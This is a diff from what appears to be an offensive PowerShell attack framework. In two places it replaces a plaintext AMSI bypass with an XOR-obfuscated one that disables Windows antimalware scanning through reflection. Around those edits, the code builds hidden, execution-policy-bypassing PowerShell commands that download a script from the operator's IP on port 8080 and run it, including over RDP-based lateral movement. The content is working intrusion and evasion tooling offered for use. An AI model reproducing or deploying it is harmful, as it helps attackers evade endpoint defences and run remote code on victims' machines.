@@ -3189,7 +3189,7 @@ while (`$true) {
 			$_pipeFile  = "pipe_$PipeName.ps1"
 			$_pipePath  = Join-Path $global:AmnesiacRoot $_pipeFile
 			$_srvIP     = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
-			$_srvAmsi   = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"
+			$_srvAmsi   = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
 			$_srvCradle = "iex(new-object net.webclient).downloadstring('http://$_srvIP`:8080/$_pipeFile')"
 			$_srvCmd    = "powershell -nop -ep bypass -w hidden -c `"$_srvAmsi;$_srvCradle`""
 			$global:LastInlinePS = $built.InlinePS
@@ -3432,7 +3432,7 @@ while (`$true) {
 		$_pipeFile    = "pipe_$PN.ps1"
 		$_pipePath    = Join-Path $global:AmnesiacRoot $_pipeFile
 		$_operatorIP  = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
-		$_rdpAmsi     = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"
+		$_rdpAmsi     = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
 		$_rdpCradle   = "iex(new-object net.webclient).downloadstring('http://$_operatorIP`:8080/$_pipeFile')"
 		$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
 		$_srvCmd      = "powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
